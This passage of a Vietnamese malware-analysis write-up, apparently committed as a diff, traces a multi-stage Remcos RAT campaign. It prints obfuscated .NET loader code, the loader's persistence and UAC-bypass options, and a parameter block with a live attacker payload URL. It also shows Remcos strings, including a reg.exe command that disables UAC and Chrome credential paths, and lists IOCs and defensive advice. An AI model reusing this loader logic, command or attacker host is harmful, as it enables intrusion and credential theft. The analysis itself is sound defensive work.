+						string text6 = \uF110.\uEF37(text, num5, num3 - num5);
+						num6 = 4;
+						continue;
+					}
+					case 6:
+						goto IL_34C;
+					}
+					break;
+				}
+			}
+			IL_34C:
+			IEnumerable&lt;char&gt; source = text4;
+			Func&lt;char, bool&gt; &lt;&gt;9__0_;
+			Func&lt;char, bool&gt; predicate = &lt;&gt;9__0_ = Program.&lt;&gt;c.&lt;&gt;9__0_0;
+			if (&lt;&gt;9__0_ == null)
+			{
+				predicate = (Program.&lt;&gt;c.&lt;&gt;9__0_0 = new Func&lt;char, bool&gt;(Program.&lt;&gt;c.&lt;&gt;9.\uE000));
+			}
+			bool flag9 = ((!source.All(predicate)) ? \uE430.\uE050(0) : ((\uF10F.\uEF37(text4) % \uE430.\uE050(4) == \uE430.\uE050(0)) ? 1 : 0)) != 0;
+			bool flag10 = flag9;
+			byte[] array3;
+			if (flag10)
+			{
+				int i;
+				for (;;)
+				{
+					int num7 = \uE430.\uE050(13);
+					for (;;)
+					{
+						switch (num7 ^ \uE430.\uE050(4))
+						{
+						case 5:
+							array3 = new byte[\uF10F.\uEF37(text4) / \uE430.\uE050(4)];
+							num7 = 4;
+							continue;
+						case 6:
+							i = \uE430.\uE050(0);
+							num7 = 5;
+							continue;
+						case 7:
+							goto IL_40C;
+						}
+						break;
+					}
+				}
+				IL_40C:
+				while (i &lt; array3.Length)
+				{
+					for (;;)
+					{
+						int num8 = \uE430.\uE050(32);
+						for (;;)
+						{
+							num8 ^= \uE430.\uE050(9);
+							switch (num8 + 7)
+							{
+							case 0:
+								num8 = -1;
+								continue;
+							case 1:
+								array3[i] = \uE001\uF15D.\uEF37(\uF110.\uEF37(text4, i * \uE430.\uE050(4), \uE430.\uE050(4)), \uE430.\uE050(18));
+								num8 = -3;
+								continue;
+							case 2:
+								goto IL_470;
+							}
+							break;
+						}
+					}
+					IL_470:
+					i += \uE430.\uE050(1);
+				}
+			}
+			else
+			{
+				array3 = \uE000\uE1FA.\uEF37(text4);
+			}
+			\uE001\uF15E.\uEF37(array3, nativeDllPath, nativeDllName, clrPath);
+		}
+	}
+	catch (Exception)
+	{
+	}
+}
+</code></pre>
+<p>Hàm Main đóng vai trò là loader trung tâm (core loader) của payload giai đoạn 2. Chức năng chính của hàm bao gồm:</p>
+<ul>
+<li>Thiết lập môi trường thực thi </li>
+<li>Thiết lập cơ chế persistence (tùy chọn) </li>
+<li>Tải và giải mã payload từ xa </li>
+<li>Thực thi payload trong bộ nhớ</li>
+</ul>
+<p>Toàn bộ hành vi được điều khiển thông qua các tham số đầu vào, cho phép attacker tùy biến linh hoạt theo từng chiến dịch.</p>
+<h3 id="Co-che-khoi-tao-va-thiet-lap-moi-truong"><a href="#Co-che-khoi-tao-va-thiet-lap-moi-truong" class="headerlink" title="Cơ chế khởi tạo và thiết lập môi trường"></a>Cơ chế khởi tạo và thiết lập môi trường</h3><p>Ở giai đoạn đầu, hàm thực hiện:</p>
+<ul>
+<li>Thiết lập giao thức mạng (nhiều khả năng là TLS) </li>
+<li>Chuẩn bị môi trường cho việc tải dữ liệu từ xa</li>
+</ul>
+<p>Mục đích:</p>
+<ul>
+<li>Đảm bảo kết nối tới C2 hoặc server tải payload hoạt động ổn định</li>
+</ul>
+<h3 id="Thiet-lap-co-che-persistence"><a href="#Thiet-lap-co-che-persistence" class="headerlink" title="Thiết lập cơ chế persistence"></a>Thiết lập cơ chế persistence</h3><p>Hàm Main kiểm tra nhiều flag đầu vào để quyết định có triển khai persistence hay không:<br>Các cơ chế được hỗ trợ:</p>
+<ul>
+<li>Scheduled Task <ul>
+<li>Tạo task chạy định kỳ dựa trên intervalMinutes</li>
+</ul>
+</li>
+<li>Startup Task <ul>
+<li>Tự động chạy khi hệ thống khởi động</li>
+</ul>
+</li>
+<li>Registry Run key <ul>
+<li>Ghi vào registry để auto start</li>
+</ul>
+</li>
+<li>UAC bypass (có điều kiện) <ul>
+<li>Nếu flag bật và môi trường phù hợp → thực thi nâng quyền</li>
+</ul>
+</li>
+<li>VM Detection <ul>
+<li>Kiểm tra môi trường sandbox&#x2F;VM và có thể thay đổi hành vi</li>
+</ul>
+</li>
+</ul>
+<p>Điểm đáng chú ý:</p>
+<ul>
+<li>Tất cả đều config-driven (điều khiển qua tham số) cho thấy payload có tính modular cao</li>
+</ul>
+<p>Tải payload từ xa</p>
+<pre><code class="language-c#">WebClient webClient = ...
+array = webClient.DownloadData(encodedUrlPayload);
+</code></pre>
+<ul>
+<li>Sử dụng WebClient để tải dữ liệu từ URL (encodedUrlPayload) </li>
+<li>Dữ liệu trả về ở dạng byte[]</li>
+</ul>
+<p>Sau đó chuyển dữ liệu thành chuỗi để xử lý tiếp.</p>
+<pre><code class="language-c#">string text = Encoding.UTF8.GetString(array);
+</code></pre>
+<h3 id="Trich-xuat-payload-tu-noi-dung"><a href="#Trich-xuat-payload-tu-noi-dung" class="headerlink" title="Trích xuất payload từ nội dung"></a>Trích xuất payload từ nội dung</h3><p>Payload không được sử dụng trực tiếp mà được ẩn trong nội dung tải về, và được trích xuất thông qua:</p>
+<ul>
+<li>Tìm marker bắt đầu và kết thúc </li>
+<li>Cắt chuỗi nằm giữa hai marker</li>
+</ul>
+<p>Nếu không tìm thấy marker → dừng thực thi payload.</p>
+<p><strong><u>Kết luận điều tra sơ bộ</u></strong></p>
+<p>Dựa trên các phân tích trên và dựa vào các tham số được truyền vào hàm Main từ giai đoạn 1, có thể xác định rõ ràng các hành vi cụ thể mà payload thực hiện trong môi trường nạn nhân.</p>
+<pre><code class="language-powershell">$Limon = @(
+  &#39;http://192.3.176.237/100/img_043611.png&#39;,                         // encodedUrlPayload
+  &#39;&#39;,                                                                                             // flagRegStartup
+  &#39;C:\Users\Public\Downloads\&#39;,                                              // vbsPath
+  &#39;Name_File&#39;,                                                                           // vbsName
+  &#39;Caspol&#39;,                                                                                 // clrPath
+  &#39;&#39;,                                                                                            // nativeDllPath
+  &#39;Caspol&#39;,                                                                                // nativeDllName
+  &#39;&#39;,                                                                                           // flagTaskPersistence
+  &#39;URL&#39;,                                                                                   // payloadUrl
+  &#39;C:\Users\Public\Downloads\&#39;,                                            // outputPath
+  &#39;Name_File&#39;,                                                                        // outputName
+  &#39;hta&#39;,                                                                                    // fileExt
+  &#39;1&#39;,                                                                                       // intervalMinutes
+  &#39;&#39;,                                                                                         // flagStartupTask
+  &#39;Task_Name&#39;,                                                                      // schedulerTaskName
+  &#39;0&#39;,                                                                                      // vmDetectionName
+  &#39;&#39;,                                                                                        // flagUacStart
+  &#39;&#39;,                                                                                        // uacPayloadUrl
+  &#39;&#39;                                                                                         // uacCommand
+)
+</code></pre>
+<h3 id="Ket-luan-dieu-tra-cua-giai-doan-2"><a href="#Ket-luan-dieu-tra-cua-giai-doan-2" class="headerlink" title="Kết luận điều tra của giai đoạn 2"></a>Kết luận điều tra của giai đoạn 2</h3><p>Hàm Main trong mã độc .dll cho thấy đây là một loader .NET hoàn chỉnh, với các đặc điểm:</p>
+<ul>
+<li>Điều khiển bằng tham số → linh hoạt cao </li>
+<li>Hỗ trợ nhiều cơ chế persistence.</li>
+<li>Obfuscation nhiều lớp.</li>
+<li>Thực thi payload tiếp theo trong bộ nhớ (in-memory). </li>
+<li>Có khả năng né sandbox&#x2F;VM</li>
+</ul>
+<h2 id="Phan-tich-ma-doc-giai-doan-3-–-ma-doc-img-043611-png"><a href="#Phan-tich-ma-doc-giai-doan-3-–-ma-doc-img-043611-png" class="headerlink" title="Phân tích mã độc giai đoạn 3 – mã độc img_043611.png"></a>Phân tích mã độc giai đoạn 3 – mã độc img_043611.png</h2><h3 id="Phan-tich-mau-ma-doc-img-043611-png"><a href="#Phan-tich-mau-ma-doc-img-043611-png" class="headerlink" title="Phân tích mẫu mã độc img_043611.png"></a>Phân tích mẫu mã độc img_043611.png</h3><p>Mã độc img_043611.png cũng cung cấp cho tôi 1 hình ảnh có vẻ như là hình nền Desktop lành tính.</p>
+<p><img src="/posts/63ed56db/image10.png" alt="Hình 10 - Hình nền MSI"></p>
+<p>Tuy nhiên, khi tiến hành phân tích chuỗi, tôi phát hiện cơ chế ẩn dấu payload trong hình nền này có đặc tính tương đồng với cơ chế của mã độc ở giai đoạn 2. Cụ thể, payload lúc này được phân tách bằng cặp chuỗi INICIO- và VTFIM</p>
+<pre><code>INICIO####… ###QqVTFIM
+</code></pre>
+<p><img src="/posts/63ed56db/image11.png" alt="Hình 11 - Điểm bắt đầu của payload độc hại trong img_ 043611.png"></p>
+<p><img src="/posts/63ed56db/image12.png" alt="Hình 12 - Điểm kết thúc của payload độc hại trong img_ 043611.png"></p>
+<p>Ngay sau khi giải mã payload, tôi xác định payload này chính là Remcos Agent 7.2.0 Pro thông qua 1 vài signature bên dưới</p>
+<pre><code class="language-terminal">…
+64-bit Agent.
+CooLib
+SysCo
+SysCoR
+SysHlp
+CurrentBuildNumber
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+FU7G&amp;
+NtFreeVirtualMemory
+RtlAcquirePebLock
+/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD 
+0 /f
+C:\Windows\System32\cmd.exe
+…
+Online Keylogger Started
+vvW&quot;
+Offline Keylogger Stopped
+[Space]
+[Tab]
+[Alt]
+[Esc]
+[PagDw]
+[Start]
+[Down]
+[Print]
+[Ins]
+[Menu]
+[F1]
+[F4]
+[F7]
+[F10]
+[F11]
+7FVB
+[CtrlR]
+\AppData\Local\Google\Chrome\User Data\Default\Login Data
+UserProfile
+[Chrome StoredLogins found, cleared!]
+\AppData\Local\Google\Chrome\User Data\Default\Cookies
+…
+iostream stream error
+ios_base::failbit set
+license_code.txt
+-Sys
+licence
+Remcos Agent initialized 
+User
+66W72
+Administrator
+override
+7.2.0 Pro
+</code></pre>
+<h3 id="Ket-luan-dieu-tra-cua-giai-doan-3"><a href="#Ket-luan-dieu-tra-cua-giai-doan-3" class="headerlink" title="Kết luận điều tra của giai đoạn 3"></a>Kết luận điều tra của giai đoạn 3</h3><p>Do đoạn payload Remcos Agent được obfuscation tinh v, việc phân tích tĩnh (static analysis) không thể trích xuất được các chỉ số quan trọng như địa chỉ IP của máy chủ Command &amp; Control (C&amp;C), tên miền, chuỗi cấu hình hoặc các tham số kết nối, tiến trình khởi tạo kết nối…</p>
+<p>Để vượt qua hạn chế này, tôi tiến hành tái tạo toàn bộ Kill Chain của mẫu mã độc trong môi trường sandbox cách ly hoàn toàn (isolated sandbox). Bằng cách phân tích động mẫu mã trong các hệ thống ảo được giám sát chặt chẽ, tôi có thể quan sát hành vi thời gian thực các hành vi của mã độc này.</p>
+<p>Ở bước phân tích bên dưới, tôi sử dụng WireShark để ghi nhận lưu lượng mạng (network traffic), các kết nối outbound, beaconing pattern, cũng như các lệnh được thực thi sau khi payload giải mã tại runtime. Bên cạnh đó, tôi sử dụng các công cụ giám sát tiến trình đáng ngờ sinh ra sau khi thực thi mã độc</p>
+<h2 id="Tai-tao-Kill-Chain-trong-moi-truong-sandbox"><a href="#Tai-tao-Kill-Chain-trong-moi-truong-sandbox" class="headerlink" title="Tái tạo Kill Chain trong môi trường sandbox"></a>Tái tạo Kill Chain trong môi trường sandbox</h2><h3 id="Tai-thiet-lap-payload-PowerShell-loader-dau-vao"><a href="#Tai-thiet-lap-payload-PowerShell-loader-dau-vao" class="headerlink" title="Tái thiết lập payload PowerShell loader đầu vào"></a>Tái thiết lập payload PowerShell loader đầu vào</h3><p>Mẫu mã độc ban đầu được thiết kế để tải hai file hình ảnh (optimized_MSI.png và img_043611.png) từ hạ tầng của kẻ tấn công thông qua lệnh download trực tiếp từ URL. Hai file PNG này thực chất chứa payload được nhúng dưới dạng dữ liệu mã hóa, sau đó sẽ được PowerShell loader giải mã và thực thi tại runtime. Tuy nhiên, do môi trường sandbox mà tôi sử dụng là môi trường cách ly hoàn toàn (fully isolated sandbox), không có kết nối internet ra ngoài, nên quá trình tải file từ hạ tầng C&amp;C của kẻ tấn công không thể thực hiện được nhằm đảm bảo an toàn bảo mật.</p>
+<p>Để tái tạo chính xác hành vi của PowerShell loader trong điều kiện sandbox, tôi đã tái thiết lập payload đầu vào bằng cách cấu hình cứng (hard-coded) hai file PNG độc hại vào thư mục làm việc hiện hành của sandbox. Cụ thể, hai file png1.png (optimized_MSI.png) và png2.png (img_043611.png) được đặt trực tiếp vào cùng thư mục với script PowerShell loader. Sau đó, tôi xử lý hai file này ngay từ ổ đĩa thay vì tải từ mạng.</p>
+<p>Việc tái thiết lập này cho phép payload PowerShell loader hoạt động gần như nguyên bản trong môi trường cách ly, từ đó quan sát được đầy đủ các giai đoạn giải mã, giải nén, inject process và thực thi payload chính mà không làm mất tính toàn vẹn của chuỗi tấn công.</p>
+<p><img src="/posts/63ed56db/image13.png" alt="Hình 13 - Cấu hình cứng payload độc hại"></p>
+<h3 id="Thuc-thi-loader"><a href="#Thuc-thi-loader" class="headerlink" title="Thực thi loader"></a>Thực thi loader</h3><p>Ngay sau khi kích hoạt payload PowerShell loader trong môi trường sandbox, tôi tiến hành giám sát lưu lượng mạng bằng Wireshark. Kết quả ghi nhận máy chủ sandbox đã thực hiện truy vấn DNS đến tên miền newangelnewlifenewhopeformoneygetrichbac.duckdns.org. Tên miền này được xác định là địa chỉ Command &amp; Control (C&amp;C) của mẫu mã độc.</p>
+<p>Đồng thời, qua theo dõi hoạt động tiến trình (process monitoring), tôi quan sát thấy tiến trình Caspol.exe được sinh ra với hành vi và cấu hình gần như giống hệt những gì được mô tả trong mã nguồn PowerShell loader. Tiến trình này nhanh chóng thực hiện các hoạt động kết nối ngược (reverse connection), gửi beaconing và trao đổi dữ liệu với máy chủ C&amp;C thông qua tên miền đã phát hiện.<br>Việc quan sát được truy vấn DNS và sự xuất hiện của tiến trình Caspol.exe ngay trong giai đoạn đầu đã xác nhận rằng việc tái thiết lập hai file PNG độc hại (png1.png và png2.png) thành công, cho phép loader hoạt động đúng theo logic ban đầu của mã độc mà không bị gián đoạn do môi trường cách ly.</p>
+<p><img src="/posts/63ed56db/image14.png" alt="Hình 14 - Tiến trình CasPol.exe sinh ra và hành vi truy vấn DNS"></p>
+<h2 id="Ket-luan-phan-tich"><a href="#Ket-luan-phan-tich" class="headerlink" title="Kết luận phân tích"></a>Kết luận phân tích</h2><p>Ở bản tin này, tôi đã tái hiện lại 1 chiến dịch vận chuyển và phát tán mã độc Remcos. Từ giai đoạn ban đầu khi người dùng mở tệp .hta độc hại, qua việc mshta.exe thực thi script HTA, giải mã và khởi chạy lệnh PowerShell, đến việc tải file giả dạng ảnh (optimized_MSI.png), trích xuất payload ẩn, load .NET assembly qua Reflection, và cuối cùng triển khai payload Remcos RAT từ file img_043611.png.</p>
+<p>Chiến dịch này thể hiện rõ xu hướng tấn công hiện đại: kết hợp nhiều lớp obfuscation, steganography trong file hình ảnh và kỹ thuật fileless&#x2F;mixed execution (PowerShell → .NET Reflection) nhằm né tránh các giải pháp phát hiện dựa trên chữ ký và file tĩnh.<br>Việc sử dụng tên miền động làm kênh Command &amp; Control cùng tiến trình Caspol.exe làm loader cho thấy sự tinh vi trong việc ẩn giấu phần mềm độc hại.</p>
+<p>Kết quả phân tích khẳng định rằng Remcos RAT không chỉ là một công cụ RAT thương mại thông thường mà còn được tích hợp vào các chuỗi tấn công đa giai đoạn (multi-stage), cho phép kẻ tấn công duy trì quyền kiểm soát lâu dài, thu thập thông tin nhạy cảm (keylogger, screenshot, clipboard, remote desktop…) và thực hiện các hành động trên hệ thống nạn nhân một cách hiệu quả.</p>
+<p>Phát hiện này một lần nữa nhấn mạnh nhu cầu nâng cao nhận thức bảo mật cho người dùng cuối, đồng thời khuyến nghị các tổ chức triển khai các biện pháp phòng thủ theo chiều sâu:</p>
+<ul>
+<li>Giám sát chặt chẽ hành vi script (HTA, PowerShell, mshta.exe)</li>
+<li>Phát hiện bất thường lưu lượng mạng và truy vấn DNS động</li>
+<li>Sử dụng sandbox kết hợp EDR&#x2F;XDR có khả năng phân tích memory injection và steganography</li>
+<li>Áp dụng nguyên tắc zero-trust và hạn chế thực thi macro&#x2F;script không tin cậy.</li>
+</ul>
+<p>Việc hiểu rõ và tái tạo được toàn bộ kill chain của chiến dịch Remcos RAT sẽ góp phần hỗ trợ xây dựng các quy tắc phát hiện (detection rules), signature và hunting query hiệu quả hơn trong tương lai</p>
+<h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><h2 id="File-Hashes-SHA256"><a href="#File-Hashes-SHA256" class="headerlink" title="File Hashes (SHA256)"></a>File Hashes (SHA256)</h2><ul>
+<li>kmh.hta - SHA256: e58aba655675d2479bebf957fb376036d34cf923c87c673031ec7cdbda0d6113</li>
+<li>optimized_MSI.png - SHA256: a945e648556cb1ef96710cd1682c9bb989dcfa4809dd7f84f31413aeb87f144a</li>
+<li>img_043611.png - SHA256: fe5976e410f16cede5424e075c5e019d7885cee48178a40457ec7d8be11e66e1</li>
+<li>Fiber.dll loader - SHA256: b6189e400b3af2b5ed115606c712d758c54de2fd13c93ed2fbfab524ef9d83ff</li>
+</ul>
+<h2 id="Network-Indicators"><a href="#Network-Indicators" class="headerlink" title="Network Indicators"></a>Network Indicators</h2><ul>
+<li>Type attacker server: 192[.]3.176.237</li>
+<li>Type: C&amp;C IP – 96[.]44.159.137</li>
+<li>Type: C2 Domain - newangelnewlifenewhopeformoneygetrichbac.duckdns.org</li>
+</ul>
+<h1 id="Cai-ket"><a href="#Cai-ket" class="headerlink" title="Cái kết"></a>Cái kết</h1><p>…</p>
